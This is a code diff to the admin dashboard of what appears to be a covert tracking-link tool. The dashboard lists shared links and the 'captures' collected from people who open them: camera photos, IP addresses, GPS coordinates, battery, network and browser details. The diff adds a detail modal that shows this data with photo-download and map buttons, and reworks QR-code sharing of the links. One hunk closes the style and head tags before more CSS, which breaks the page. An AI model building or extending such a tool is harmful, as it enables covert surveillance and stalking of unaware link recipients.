@@ -424,16 +424,46 @@
         .modal-row .btn { flex: 1; justify-content: center; }
         .perm-row { display: flex; gap: 18px; margin-top: 10px; flex-wrap: wrap; }
 
+        /* Info Modal */
+        #infoModal .modal-box { max-width: 480px; width: 95vw; }
+        .info-header {
+            display: flex; align-items: center; gap: 12px; margin-bottom: 18px;
+            padding-bottom: 14px; border-bottom: 1px solid var(--border);
+        }
+        .info-avatar {
+            width: 52px; height: 52px; border-radius: 10px; object-fit: cover;
+            object-position: center top; border: 2px solid var(--border);
+            flex-shrink: 0; background: var(--bg2);
+            display: flex; align-items: center; justify-content: center; font-size: 22px;
+        }
+        .info-avatar img { width: 100%; height: 100%; object-fit: cover; object-position: center top; border-radius: 8px; }
+        .info-title h4 { font-size: 15px; font-weight: 700; margin-bottom: 2px; }
+        .info-title p  { font-size: 11px; color: var(--muted); }
+        .info-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px;
+        }
+        .info-row {
+            background: var(--bg2); border-radius: 8px; padding: 9px 12px;
+            border: 1px solid var(--border);
+        }
+        .info-row .ik { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .04em; margin-bottom: 3px; }
+        .info-row .iv { font-size: 12px; font-weight: 600; word-break: break-all; }
+        .info-row.full { grid-column: 1 / -1; }
+        .info-gps-link { color: var(--teal); text-decoration: none; font-size: 12px; }
+        .info-gps-link:hover { text-decoration: underline; }
+
         /* QR Modal */
         #qrModal .modal-box { text-align: center; }
-        #qrCanvas { margin: 12px auto; display: block; border-radius: 8px; }
+        #qrContainer { margin: 14px auto; display: flex; align-items: center; justify-content: center; min-height: 200px; }
+        #qrContainer canvas, #qrContainer img { border-radius: 8px; border: 8px solid #fff; }
         #qrUrlText {
             font-size: 11px; color: var(--muted);
             word-break: break-all; margin-top: 8px;
-            background: var(--bg2); padding: 8px; border-radius: 6px;
+            background: var(--bg2); padding: 8px 12px; border-radius: 6px; text-align: left;
         }
-
-        /* ══════════════════════════════════════════════════════════
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>        /* ══════════════════════════════════════════════════════════
            TOAST
         ══════════════════════════════════════════════════════════ */
         #toastStack {
@@ -555,15 +585,35 @@
     </div>
 </div>
 
+<!-- Info / Device Detail Modal -->
+<div id="infoModal" class="modal-overlay">
+    <div class="modal-box">
+        <h3>📋 Capture Details</h3>
+        <div class="info-header">
+            <div class="info-avatar" id="infoAvatar"></div>
+            <div class="info-title">
+                <h4 id="infoName">—</h4>
+                <p id="infoMeta">—</p>
+            </div>
+        </div>
+        <div class="info-grid" id="infoGrid"></div>
+        <div class="modal-row">
+            <button class="btn btn-teal"  id="infoDownloadBtn"  style="display:none;">⬇️ Save Photo</button>
+            <button class="btn btn-green" id="infoMapBtn"       style="display:none;">🗺️ View on Map</button>
+            <button class="btn btn-gray"  id="closeInfoModal">Close</button>
+        </div>
+    </div>
+</div>
+
 <!-- QR Code Modal -->
 <div id="qrModal" class="modal-overlay">
     <div class="modal-box">
         <h3>📱 Share Link via QR</h3>
-        <canvas id="qrCanvas" width="200" height="200"></canvas>
+        <div id="qrContainer"></div>
         <div id="qrUrlText"></div>
         <div class="modal-row">
-            <button class="btn btn-teal"    id="downloadQrBtn">⬇️ Download QR</button>
-            <button class="btn btn-gray"    id="closeQrModal">Close</button>
+            <button class="btn btn-teal" id="downloadQrBtn">⬇️ Download QR</button>
+            <button class="btn btn-gray" id="closeQrModal">Close</button>
         </div>
     </div>
 </div>
@@ -1037,7 +1087,7 @@ function renderLinksTable() {
                 ${l.active ? '● ACTIVE' : '● OFF'}
             </td>
             <td><b style="color:var(--yellow);">${l.visits || 0}</b></td>
-            <td style="font-size:11px;color:var(--muted);">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() : '—'}</td>
+            <td style="font-size:11px;color:var(--muted);">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() + '<br><span style="color:#475569;">' + new Date(l.createdAt).toLocaleTimeString() + '</span>' : '—'}</td>
             <td style="white-space:nowrap;">
                 <button class="btn btn-gray btn-sm"    data-action="copy"   data-id="${id}">📋 Copy</button>
                 <button class="btn btn-teal btn-sm"    data-action="qr"     data-id="${id}">📱 QR</button>
@@ -1185,7 +1235,7 @@ function buildCapCard(key, p, inBin = false) {
         <div class="card-body">
             ${!inBin ? `<label class="check-label" style="margin-bottom:6px;">
                 <input type="checkbox" class="cap-select" data-key="${key}"> <b>${esc(p.linkName)}</b>
-            </label>` : `<p><b>${esc(p.linkName)}</b></p>`}
+            </label>` : `<p style="font-weight:700;margin-bottom:4px;">${esc(p.linkName)}</p>`}
             <p class="meta"><span class="tag">${esc(d.os||'?')}</span><span class="tag">${esc(d.browser||'?')}</span></p>
             <p class="meta">🌐 ${esc(p.ipAddress||'N/A')}</p>
             <p class="meta">📍 ${hasGPS
@@ -1193,25 +1243,11 @@ function buildCapCard(key, p, inBin = false) {
                 : 'GPS Denied'}</p>
             <p class="meta">🕐 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
             ${inBin ? `<p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
-
-            <div class="device-panel" id="dp_${key}">
-                <div class="dp-row"><span class="dp-key">OS</span><span class="dp-val">${esc(d.os||'N/A')}</span></div>
-                <div class="dp-row"><span class="dp-key">Browser</span><span class="dp-val">${esc(d.browser||'N/A')}</span></div>
-                <div class="dp-row"><span class="dp-key">Screen</span><span class="dp-val">${d.screenWidth||'?'}×${d.screenHeight||'?'}</span></div>
-                <div class="dp-row"><span class="dp-key">Battery</span><span class="dp-val">${esc(d.battery||'N/A')}${d.charging==='Yes'?' ⚡':''}</span></div>
-                <div class="dp-row"><span class="dp-key">Network</span><span class="dp-val">${esc(d.networkType||'N/A')} (${esc(d.downlink||'?')})</span></div>
-                <div class="dp-row"><span class="dp-key">IP</span><span class="dp-val">${esc(p.ipAddress||'N/A')}</span></div>
-                <div class="dp-row"><span class="dp-key">Timezone</span><span class="dp-val">${esc(d.timezone||'N/A')}</span></div>
-                <div class="dp-row"><span class="dp-key">Language</span><span class="dp-val">${esc(d.language||'N/A')}</span></div>
-                <div class="dp-row"><span class="dp-key">Platform</span><span class="dp-val">${esc(d.platform||'N/A')}</span></div>
-                <div class="dp-row"><span class="dp-key">Referrer</span><span class="dp-val">${esc(d.referrer||'Direct')}</span></div>
-                ${hasGPS ? `<div class="dp-row"><span class="dp-key">Coords</span><span class="dp-val">${p.latitude}, ${p.longitude}</span></div>` : ''}
-            </div>
         </div>
         <div class="card-actions">
             ${p.image ? `<button class="btn btn-teal btn-sm" data-action="download" data-key="${key}">⬇ Save</button>` : ''}
-            ${hasGPS  ? `<button class="btn btn-gray btn-sm" data-action="copygps" data-key="${key}">📍 Copy GPS</button>` : ''}
-            <button class="btn btn-gray btn-sm" data-action="toggleDevice" data-key="${key}">📋 Info</button>
+            ${hasGPS  ? `<button class="btn btn-gray btn-sm" data-action="copygps" data-key="${key}">📍 GPS</button>` : ''}
+            <button class="btn btn-primary btn-sm" data-action="showInfo" data-key="${key}">📋 Info</button>
             ${inBin
                 ? `<button class="btn btn-green btn-sm" data-action="restore" data-key="${key}">♻️ Restore</button>
                    <button class="btn btn-red   btn-sm" data-action="burn"    data-key="${key}">🔥 Burn</button>`
@@ -1283,9 +1319,8 @@ document.getElementById('photoGrid').addEventListener('click', e => {
 
     if (action === 'download' && p?.image) {
         dlImg(p.image, `capture_${p.linkName||'unknown'}_${Date.now()}.jpg`);
-    } else if (action === 'toggleDevice') {
-        const panel = document.getElementById('dp_' + key);
-        if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    } else if (action === 'showInfo') {
+        openInfoModal(p);
     } else if (action === 'copygps' && p) {
         navigator.clipboard.writeText(p.latitude + ', ' + p.longitude)
             .then(() => toast('📍 GPS copied!', 'var(--teal)'));
@@ -1340,9 +1375,8 @@ document.getElementById('recentGrid').addEventListener('click', e => {
     if (!btn) return;
     const { action, key } = btn.dataset;
     const p = allLogsData?.[key];
-    if (action === 'toggleDevice') {
-        const panel = document.getElementById('dp_' + key);
-        if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    if (action === 'showInfo') {
+        openInfoModal(p);
     } else if (action === 'download' && p?.image) {
         dlImg(p.image, `capture_${p.linkName||'x'}_${Date.now()}.jpg`);
     } else if (action === 'copygps' && p) {
@@ -1469,9 +1503,8 @@ document.getElementById('binGrid').addEventListener('click', e => {
 
     if (action === 'download' && item.image) {
         dlImg(item.image, `capture_${item.linkName||'x'}_${Date.now()}.jpg`);
-    } else if (action === 'toggleDevice') {
-        const panel = btn.closest('.bin-card')?.querySelector('.device-panel');
-        if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    } else if (action === 'showInfo') {
+        openInfoModal(item);
     } else if (action === 'copygps' && item.latitude && item.latitude !== 'Denied') {
         navigator.clipboard.writeText(item.latitude + ', ' + item.longitude).then(() => toast('📍 GPS copied!', 'var(--teal)'));
     } else if (action === 'restore') {
@@ -1524,6 +1557,73 @@ document.getElementById('emptyBinLinkBtn').onclick = () => {
 };
 
 // ══════════════════════════════════════════════════════════
+// INFO MODAL — advanced device detail panel
+// ══════════════════════════════════════════════════════════
+function openInfoModal(p) {
+    if (!p) return;
+    const d      = p.device || {};
+    const hasGPS = p.latitude && p.latitude !== 'Denied' && p.longitude && p.longitude !== 'Denied';
+
+    // Avatar — photo thumbnail or emoji fallback
+    const avatarEl = document.getElementById('infoAvatar');
+    avatarEl.innerHTML = p.image
+        ? `<img src="${p.image}" alt="capture">`
+        : '📷';
+
+    document.getElementById('infoName').innerText = p.linkName || 'Unknown';
+    document.getElementById('infoMeta').innerText = `${p.date || ''}  ${p.time || ''}  ·  ${p.ipAddress || 'N/A'}`;
+
+    // Build info grid rows
+    const rows = [
+        { k: '🌐 IP Address',   v: p.ipAddress || 'N/A' },
+        { k: '💻 OS',           v: d.os || 'N/A' },
+        { k: '🌍 Browser',      v: d.browser || 'N/A' },
+        { k: '📱 Platform',     v: d.platform || 'N/A' },
+        { k: '🖥 Screen',       v: d.screenWidth ? `${d.screenWidth} × ${d.screenHeight}` : 'N/A' },
+        { k: '🔋 Battery',      v: d.battery ? `${d.battery}${d.charging === 'Yes' ? ' ⚡ Charging' : ''}` : 'N/A' },
+        { k: '📶 Network',      v: d.networkType || 'N/A' },
+        { k: '⚡ Speed',        v: d.downlink || 'N/A' },
+        { k: '🗺 Timezone',     v: d.timezone || 'N/A' },
+        { k: '🗣 Language',     v: d.language || 'N/A' },
+        { k: '📅 Date',         v: p.date || 'N/A' },
+        { k: '🕐 Time',         v: p.time || 'N/A' },
+        { k: '🔗 Referrer',     v: d.referrer || 'Direct', full: true },
+        { k: '📍 GPS',          v: hasGPS ? `${p.latitude}, ${p.longitude}` : 'Denied', full: hasGPS },
+        { k: '🔑 Link ID',      v: p.linkId || 'N/A', full: true },
+    ];
+
+    const grid = document.getElementById('infoGrid');
+    grid.innerHTML = rows.map(r =>
+        `<div class="info-row${r.full ? ' full' : ''}">
+            <div class="ik">${r.k}</div>
+            <div class="iv">${esc(String(r.v))}</div>
+        </div>`
+    ).join('');
+
+    // Action buttons
+    const dlBtn  = document.getElementById('infoDownloadBtn');
+    const mapBtn = document.getElementById('infoMapBtn');
+
+    if (p.image) {
+        dlBtn.style.display = '';
+        dlBtn.onclick = () => dlImg(p.image, `capture_${p.linkName||'x'}_${p.date||Date.now()}.jpg`);
+    } else {
+        dlBtn.style.display = 'none';
+    }
+
+    if (hasGPS) {
+        mapBtn.style.display = '';
+        mapBtn.onclick = () => window.open(`https://www.google.com/maps?q=${p.latitude},${p.longitude}`, '_blank');
+    } else {
+        mapBtn.style.display = 'none';
+    }
+
+    document.getElementById('infoModal').classList.add('open');
+}
+
+document.getElementById('closeInfoModal').onclick = () => document.getElementById('infoModal').classList.remove('open');
+
+// ══════════════════════════════════════════════════════════
 // LIGHTBOX
 // ══════════════════════════════════════════════════════════
 function openLightbox(src, info) {
@@ -1543,38 +1643,50 @@ document.getElementById('lightbox').addEventListener('click', e => {
 });
 
 // ══════════════════════════════════════════════════════════
-// QR CODE
+// QR CODE — uses qrcode.js (loaded from CDN, no external API call)
 // ══════════════════════════════════════════════════════════
-let currentQrUrl = '';  // BUG FIX: store URL so downloadQrBtn can reference without stacking onclick
+let currentQrUrl = '';
 
 function showQR(url) {
     currentQrUrl = url;
     document.getElementById('qrUrlText').innerText = url;
     document.getElementById('qrModal').classList.add('open');
 
-    const canvas = document.getElementById('qrCanvas');
-    const ctx    = canvas.getContext('2d');
-    ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
-    ctx.fillStyle = '#666'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
-    ctx.fillText('Loading QR...', 100, 105);
+    const container = document.getElementById('qrContainer');
+    container.innerHTML = '';   // clear previous QR
 
-    const img = new Image();
-    img.crossOrigin = 'anonymous';
-    img.onload = () => { ctx.clearRect(0,0,200,200); ctx.drawImage(img, 0, 0, 200, 200); };
-    img.onerror = () => {
-        ctx.fillStyle = '#fff'; ctx.fillRect(0,0,200,200);
-        ctx.fillStyle = '#444'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
-        ctx.fillText('QR unavailable', 100, 90);
-        ctx.fillStyle = '#888'; ctx.font = '11px sans-serif';
-        ctx.fillText('Copy the URL below', 100, 112);
-    };
-    img.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(url)}&choe=UTF-8`;
+    try {
+        // qrcode.js generates a canvas/img element inside the container
+        new QRCode(container, {
+            text:          url,
+            width:         200,
+            height:        200,
+            colorDark:     '#000000',
+            colorLight:    '#ffffff',
+            correctLevel:  QRCode.CorrectLevel.H
+        });
+    } catch(err) {
+        container.innerHTML = `<div style="color:var(--muted);font-size:12px;text-align:center;padding:30px;">
+            QR generation failed.<br>Copy the URL below.
+        </div>`;
+    }
 }
+
 document.getElementById('closeQrModal').onclick = () => document.getElementById('qrModal').classList.remove('open');
-// BUG FIX: wired once — no stacking
+
+// Download QR — wired once, no stacking
 document.getElementById('downloadQrBtn').onclick = () => {
     if (!currentQrUrl) return;
-    dlImg(document.getElementById('qrCanvas').toDataURL(), 'qr_link.png');
+    const container = document.getElementById('qrContainer');
+    const canvas    = container.querySelector('canvas');
+    const img       = container.querySelector('img');
+    if (canvas) {
+        dlImg(canvas.toDataURL('image/png'), 'qr_link.png');
+    } else if (img) {
+        dlImg(img.src, 'qr_link.png');
+    } else {
+        toast('⚠️ QR not ready yet.', 'var(--yellow)');
+    }
 };
 
 // ══════════════════════════════════════════════════════════
